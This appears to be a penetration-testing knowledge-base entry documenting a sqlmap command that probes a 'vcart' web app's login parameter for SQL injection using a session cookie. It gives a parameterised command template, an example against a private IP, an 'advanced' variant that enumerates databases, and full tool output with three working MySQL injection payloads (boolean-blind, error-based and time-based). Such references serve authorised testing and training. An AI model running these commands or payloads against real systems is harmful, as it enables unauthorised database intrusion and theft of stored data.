---
id: d05ecaca-eb25-48b1-a76e-1e03ce981bc6
name: sqlmap-test-sqli-with-cookie
type: command
executor: bash
data: >-
  sqlmap -u
  "http://192.168.1.10/vcart/login.php?user=demo@vcart.com&pass=demo&selop=2"
  --cookie='SESSION_ID=51feo6qnix2ct7k' -p user
output: >2
          ___
         __H__
   ___ ___[)]_____ ___ ___  {1.2.7#stable}
  |_ -| . [']     | .'| . |

  |___|_  [']_|_|_|__,|  _|
        |_|V          |_|   http://sqlmap.org

  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior
  mutual consent is illegal. It is the end user's responsibility to obey all
  applicable local, state and federal laws. Developers assume no liability and
  are not responsible for any misuse or damage caused by this program


  [*] starting at 21:22:15


  [21:22:16] [INFO] resuming back-end DBMS 'mysql' 

  [21:22:16] [INFO] testing connection to the target URL

  sqlmap got a 302 redirect to 'http://192.168.1.10:80/vcart/home.php'. Do you
  want to follow? [Y/n] y

  sqlmap resumed the following injection point(s) from stored session:

  ---

  Parameter: user (GET)
      Type: boolean-based blind
      Title: AND boolean-based blind - WHERE or HAVING clause
      Payload: user=demo@vcart.com' AND 5118=5118 AND 'vzLg'='vzLg&pass=demo&selop=2

      Type: error-based
      Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
      Payload: user=demo@vcart.com' AND (SELECT 4424 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT (ELT(4424=4424,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'QcSB'='QcSB&pass=demo&selop=2

      Type: AND/OR time-based blind
      Title: MySQL >= 5.0.12 AND time-based blind
      Payload: user=demo@vcart.com' AND SLEEP(5) AND 'nDDN'='nDDN&pass=demo&selop=2
  ---

  [21:22:18] [INFO] the back-end DBMS is MySQL

  web application technology: Apache 2.4.41, PHP 7.1.32

  back-end DBMS: MySQL >= 5.0

  [21:22:18] [INFO] fetched data logged to text files under
  '/root/.sqlmap/output/192.168.1.10'


  [*] shutting down at 21:22:18
created_at: '2020-09-02T17:47:10.124588+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Web
tags:
  - sqli
  - sqlmap
verified: true
validated: true
---

# sqlmap-test-sqli-with-cookie

## Command

```bash
sqlmap -u "$_TARGET_URL" --cookie="$_SESSION_COOKIE" -p $_PARAMETER
```

## Description

This command uses SQLMap to test a web application URL for SQL injection vulnerabilities while providing a session cookie for authentication. It focuses on a specific parameter (e.g., 'user') and handles redirects automatically. Ideal for authenticated endpoints where unauthenticated scans would fail due to login requirements.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Full URL of the target endpoint with parameters (e.g., http://example.com/login.php?user=admin&pass=pass) | Yes |
| $_SESSION_COOKIE | Valid session cookie string (e.g., SESSION_ID=abc123) | Yes |
| $_PARAMETER | Specific parameter to test for injection (e.g., user) | Yes |
| -u | Specifies the target URL | Built-in |
| --cookie | Injects the cookie header for session persistence | Built-in |
| -p | Designates the injectable parameter | Built-in |

## Examples

### Basic Usage

```bash
sqlmap -u "http://192.168.1.10/vcart/login.php?user=demo@vcart.com&pass=demo&selop=2" --cookie='SESSION_ID=51feo6qnix2ct7k' -p user
```

### Advanced Usage

```bash
sqlmap -u "$_TARGET_URL" --cookie="$_SESSION_COOKIE" -p $_PARAMETER --dbs --batch
```

This adds database enumeration and runs non-interactively.

## Expected Output

```
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.7#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 21:22:15

[21:22:16] [INFO] resuming back-end DBMS 'mysql' 
[21:22:16] [INFO] testing connection to the target URL
sqlmap got a 302 redirect to 'http://192.168.1.10:80/vcart/home.php'. Do you want to follow? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=demo@vcart.com' AND 5118=5118 AND 'vzLg'='vzLg&pass=demo&selop=2

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: user=demo@vcart.com' AND (SELECT 4424 FROM(SELECT COUNT(*),CONCAT(0x7171627171,(SELECT (ELT(4424=4424,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'QcSB'='QcSB&pass=demo&selop=2

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: user=demo@vcart.com' AND SLEEP(5) AND 'nDDN'='nDDN&pass=demo&selop=2
---
[21:22:18] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.41, PHP 7.1.32
back-end DBMS: MySQL >= 5.0
[21:22:18] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.1.10'

[*] shutting down at 21:22:18

```

Description of what output to expect when the command runs successfully: SQLMap displays its banner, processes the URL with cookie authentication, detects injection types, confirms the DBMS, and logs results. Look for 'injected point(s)' and file paths for dumped data.

## Related

- [[procedures/sqlmap-exploit-sqli-with-session-cookie]]
- [[tools/sqlmap]]
